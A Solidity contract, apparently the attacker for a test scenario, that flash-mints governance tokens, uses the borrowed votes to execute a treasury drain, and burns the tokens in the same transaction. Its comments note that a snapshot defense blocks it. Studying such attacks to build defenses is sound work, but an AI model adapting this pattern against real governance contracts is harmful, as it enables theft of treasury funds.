// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {GovToken} from "./GovToken.sol";
import {Governance} from "./Governance.sol";

/// @title FlashGovAttacker — Scenario 04 exploit, parameterized by borrow size.
/// @notice In a single transaction: flash-mint `borrowVotes` of the governance
///         token, execute a treasury drain authorized by that borrowed power,
///         then burn (repay) the tokens. `borrowVotes` is the strategy knob: a
///         minimal attacker borrows exactly the quorum (indistinguishable from a
///         legitimate quorum-holding voter by vote count alone); a greedy one
///         borrows far more. A snapshot defense blocks both, because neither is
///         backed by start-of-block holdings.
contract FlashGovAttacker {
    GovToken public immutable token;
    Governance public immutable gov;
    uint256 public immutable borrowVotes;

    constructor(GovToken _token, Governance _gov, uint256 _borrowVotes) {
        token = _token;
        gov = _gov;
        borrowVotes = _borrowVotes;
    }

    function attack(uint256 drainAmount) external {
        token.mint(address(this), borrowVotes); // flash-borrow voting power
        try gov.execute(borrowVotes, address(this), drainAmount) {} catch {}
        token.burn(address(this), borrowVotes); // repay
    }

    receive() external payable {}
}
